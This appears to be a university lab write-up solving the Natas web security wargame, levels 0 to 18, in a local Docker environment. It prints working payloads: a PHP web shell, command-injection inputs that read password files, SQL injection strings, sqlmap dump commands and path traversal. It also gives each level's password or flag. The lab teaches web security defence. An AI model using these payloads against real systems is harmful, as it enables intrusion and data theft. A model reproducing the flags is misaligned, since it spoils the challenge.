# Natas Wargame - Web Security Challenge Lab

**Web Application Security Vulnerability Analysis and Exploitation**  
*University of San Diego Student Lab - July 30, 2025*  
*Network Security Engineering Course*

## Objective

This lab introduces common web security vulnerabilities through progressive challenges. Students learn to identify and exploit security flaws including HTTP authentication bypasses, directory traversal, command injection, SQL injection, file upload vulnerabilities, and session management weaknesses. Each level builds upon previous concepts while introducing new attack vectors and defense considerations.

## Prerequisites

- Basic understanding of HTTP protocol and web applications
- Familiarity with browser developer tools
- Command line experience (curl, grep, basic shell commands)
- Docker and Docker Compose installed
- Text editor or hex editor for file manipulation
- Optional: Burp Suite or similar web proxy tool
- Optional: SQLmap for automated SQL injection testing

## Lab Setup

### Step 1: Download Required Files
Download the compressed lab environment:
- `natas.tar.gz` - Contains 3 Docker images
- `Student_Instructions.md.docx` - Installation guide

### Step 2: Load Docker Images
```bash
cd /path/to/natas/directory
docker load -i natas-mysql-2.tar
docker load -i natas-web-2.tar
```

### Step 3: Start Lab Environment
```bash
docker stop natas-web-1 natas-mysql-1
docker-compose -f docker-compose-new.yml up -d
```

### Step 4: Access Lab Interface
Navigate to: `http://localhost:5001`

Test credentials:
- ErwinBruno:username / ErwinBruno@gmail.com
- username1:username / secret1@email.com

## Challenge Progression

### Level 0: Basic Source Code Analysis
**Objective**: Introduction to client-side information disclosure

```bash
# Access level
Username: natas0
Password: xelpUVCjxnHOUtH9g3uZNyXX3PbBkBIp
```

**Solution**: Right-click → View Page Source
**Flag**: `cx0Ug2XQ2GpP31e6m82vjF0AbjHjSJRg`

### Level 1: Developer Tools Bypass
**Objective**: Circumventing right-click restrictions

**Solution**: Use F12 or Ctrl+Shift+I to access Developer Tools
**Flag**: `c3cQqNMP9kbCovsRGhsgXyzzt2uFkgqa`

### Level 2: Directory Traversal
**Objective**: Exploring web directory structure

**Solution**: Navigate to `/files/` directory via URL manipulation
**Flag**: `jvwZ87y3RYR4QGZUFgXmWlLZnxz9J1ZE`

### Level 3: Robots.txt Analysis
**Objective**: Understanding search engine exclusion files

```bash
curl http://localhost:8080/natas3/robots.txt
```

**Solution**: Check `/s3cr3t/` directory revealed in robots.txt
**Flag**: `aiAYWOl77qltSYyJkfXmajoyKCTpshYr`

### Level 4: HTTP Referer Manipulation
**Objective**: Bypassing referer-based access controls

```bash
curl -u natas4:aiAYWOl77qltSYyJkfXmajoyKCTpshYr \
     -H "Referer: http://localhost:8080/natas5/" \
     http://localhost:8080/natas4/
```

**Flag**: `ZQ4Z1oIOtMCyoQkVpKOLpTRGPdBvfEJ2`

### Level 5: Cookie Manipulation
**Objective**: Session state tampering

**Solution**: Change cookie `loggedin: 0` to `loggedin: 1`
**Flag**: `JE39QTZnzjToPaQq1q1jJuphVxdObMST`

### Level 6: Include File Discovery
**Objective**: Local file inclusion vulnerability

**Solution**: Access `http://localhost:8080/natas6/includes/secret.inc`
**Secret**: `FOEIUWGHFEEUHOFUOIU`
**Flag**: `zLzx2id4WYHzyxmmceevO63UPzuyNQya`

### Level 7: Path Traversal via Parameters
**Objective**: Exploiting file inclusion through URL parameters

```bash
# Access password file directly
http://localhost:8080/natas7/index.php?page=/etc/natas_webpass/natas8
```

**Flag**: `3KlEdmRfcUpFcPo2sgx9XBqP8Y6xj7uK`

### Level 8: Multi-stage Encoding
**Objective**: Reverse engineering encoded data

```bash
# Decode hex -> binary -> reverse -> base64
echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
```

**Flag**: `V097z4qcLPapOrHJJ7E3CDkqWzUP5mt0`

### Level 9: Command Injection
**Objective**: Exploiting unsanitized input in shell commands

```bash
# Input: |cat /etc/natas_webpass/natas10
# Results in: grep -i |cat /etc/natas_webpass/natas10 dictionary.txt
```

**Flag**: `oEu2vdmkINvL5VxafnCf3smQbTYQqscj`

### Level 10: Filtered Command Injection
**Objective**: Bypassing basic input filtering

```bash
# Input: a /etc/natas_webpass/natas11
# Uses grep's multiple file argument feature
```

**Flag**: `Pu9UWR8Ei5O0ANvSiP4idbLfaMRA7sHr`

### Level 11: XOR Cookie Decryption
**Objective**: Breaking XOR encryption and cookie tampering

**Solution**: Extract cookie, decrypt with XOR, modify showpassword=yes, re-encrypt
**Key**: `qw8J`
**Flag**: `RL5C33ZfMLiRoagzonsgKnSmAzZ6Wafv`

### Level 12: File Upload Vulnerability
**Objective**: Bypassing file type restrictions

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

**Solution**: Upload PHP file, intercept request, change extension from .jpg to .php
**Access**: `/natas12/upload/[filename].php?cmd=cat%20/etc/natas_webpass/natas13`
**Flag**: `icskyy3mbCWmUZs7h72xCsD1GFGtkJgz`

### Level 13: Magic Bytes Bypass
**Objective**: Advanced file upload filtering evasion

**Solution**: Create PHP polyglot with JPEG header (FF D8 FF E0)
**Flag**: `M5EFjJPoZfeUFy6StflnZPk6VuZxgsv1`

### Level 14: SQL Injection Authentication Bypass
**Objective**: Breaking database authentication

```sql
-- Input: " OR 1=1 #
-- Results in: SELECT * FROM users WHERE username="" OR 1=1 # AND password="test"
```

**Flag**: `NYPI7EbUzgGVlDYqkLNGpb2bWwssSJBI`

### Level 15: Blind SQL Injection
**Objective**: Data extraction without direct output

```bash
sqlmap -u "http://localhost:8080/natas15/?username=*" \
       --auth-type Basic \
       --auth-cred "natas15:NYPI7EbUzgGVlDYqkLNGpb2bWwssSJBI" \
       --string="This user exists" \
       --technique=B --level=2 --risk=1 \
       --dbms=mysql -p username --dump
```

**Flag**: `dcfQN47g8Jk0Fkwn9fHz7VSaRn0YQYYG`

### Level 16: Blind Command Injection
**Objective**: Side-channel attack via command injection

**Solution**: Use grep behavior differences to extract password character by character
**Flag**: `VbZXCRbVWMc89uC177ABgy1GZOWXh9xh`

### Level 17: Time-based Blind SQL Injection
**Objective**: Database exploitation without visible feedback

```bash
sqlmap -u "http://localhost:8080/natas17/" \
       --data=username=natas18 \
       --auth-type=Basic \
       --auth-cred="natas17:VbZXCRbVWMc89uC177ABgy1GZOWXh9xh" \
       --technique=T --level=5 --risk=1 \
       --dbms=MySQL -D natas17 -T users -p username --dump
```

**Flag**: `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`

### Level 18: Session ID Prediction
**Objective**: Weak session management exploitation

**Solution**: Change PHPSESSID cookie to `1` (admin session)
**Flag**: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

## Cleanup

```bash
docker-compose -f docker-compose-new.yml down
docker system prune -f
```

## Results and Observations

### Key Findings

* Client-side security controls are easily bypassed through browser tools
* Directory traversal vulnerabilities allow unauthorized file system access
* Command injection occurs when user input is directly passed to system commands
* SQL injection remains prevalent in applications with poor input validation
* File upload restrictions can be circumvented through various techniques
* Session management weaknesses enable privilege escalation
* XOR encryption without proper key management is cryptographically weak

### Attack Vector Analysis

**Information Disclosure**: Source code comments, directory listings, and configuration files frequently contain sensitive data
**Input Validation Failures**: Lack of sanitization enables command injection and SQL injection attacks
**Authentication Bypasses**: Weak session handling and client-side controls allow unauthorized access
**File System Access**: Path traversal and local file inclusion provide system-level access

## Real-World Implications

### Web Application Security
These vulnerabilities represent common issues in production web applications. Organizations frequently suffer data breaches due to similar implementation flaws, particularly in custom-developed applications and legacy systems.

### Organizations at Risk
* E-commerce platforms with user-generated content
* Financial services with web portals
* Healthcare systems processing patient data
* Educational institutions with student information systems
* Government agencies with citizen-facing applications

### Business Impact
Successful exploitation can result in data theft, system compromise, regulatory violations, financial losses, and reputation damage. The OWASP Top 10 consistently includes many of these vulnerability classes.

## Defense Strategies

### Technical Mitigations
* Implement proper input validation and output encoding
* Use parameterized queries to prevent SQL injection
* Apply principle of least privilege for file system access
* Implement secure session management with proper randomization
* Use Content Security Policy (CSP) headers
* Deploy Web Application Firewalls (WAF) for additional protection

### Infrastructure Solutions
* Regular security code reviews and penetration testing
* Automated vulnerability scanning in CI/CD pipelines
* Runtime Application Self-Protection (RASP) deployment
* Network segmentation and monitoring
* Security-focused development training for developers

## Educational Value

This lab demonstrates:
* Progressive complexity in web vulnerability exploitation
* Practical application of HTTP protocol knowledge
* Critical thinking skills for security analysis
* Tool usage for security testing and validation
* Real-world attack methodology and defense planning
* Integration of multiple vulnerability types in attack chains

## Disclaimer

⚠️ **For Educational Purposes Only**
This lab is designed exclusively for educational use within the University of San Diego Network Security Engineering course. All techniques demonstrated should only be applied in controlled environments with proper authorization. Unauthorized access to computer systems is illegal and unethical.
